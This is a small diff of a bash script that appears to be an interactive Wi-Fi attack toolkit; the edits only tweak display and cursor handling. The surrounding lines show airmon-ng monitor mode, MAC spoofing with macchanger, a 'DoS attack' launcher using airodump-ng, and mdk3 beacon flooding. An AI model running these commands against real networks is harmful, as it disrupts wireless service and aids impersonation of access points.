@@ -174,12 +174,12 @@ updatepackages() {
 
 }
 monitormode() {
-	clear; echo -e "\n${blueColour}[*]$grayColour Interface:\n" && iwconfig | awk '$1~/^[a-z]+[0-9]+/{print "    " $1}'
+	clear; echo -e "\n${blueColour}[*]$grayColour Interface:\n" && iwconfig 
 	tput cnorm
 	echo -ne "\n${redColour}[?]$grayColour Network card: " && read tar
 	$cleancolor; tput civis
 	airmon-ng start $tar > /dev/null 2>&1
-	clear; echo -e "\n${blueColour}[*]$grayColour Interface:\n" && iwconfig | awk '$1~/^[a-z]+[0-9]+/{print "    " $1}'
+	clear; echo -e "\n${blueColour}[*]$grayColour Interface:\n" && iwconfig 
 	tput cnorm; echo -ne "${redColour}\n[?]$grayColour Card confirmation (Enter the name exactly as it appears): " && read tar
 	airmon-ng check kill > /dev/null 2>&1
 	ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
@@ -489,7 +489,7 @@ ntwkphishing() {
 	attack
 }
 dosattack() {
-	clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
+	tput civis; clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
 	xterm -e "airodump-ng ${tar}" &
 	dosairdump_PID=$!
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read redos
@@ -498,8 +498,8 @@ dosattack() {
 }
 
 beaconflood() {
-	clear; echo -e "\n${purpleColour}[*]$grayColour Starting Beacon Flood attack..."; sleep 2
-	echo -ne "\n${blueColour}[?]$grayColourYou Want to name the networks (Recommend (N) )? [Y/N]: " && read rpsbeacon 
+	tput civis; clear; echo -e "\n${purpleColour}[*]$grayColour Starting Beacon Flood attack..."; sleep 2
+	tput cnorm; echo -ne "\n${blueColour}[?]$grayColour You Want to name the networks (Recommend (N) )? [Y/N]: " && read rpsbeacon 
 	if [ "$rpsbeacon" == "y" ] || [ "$rpsbeacon" == "Y" ]; then
 		echo -ne "${yelloColour}[?]$grayColour Name: " && read nameap
 			xterm -hold -e "sudo mdk3 $tar b -n $nameap -s 1000"
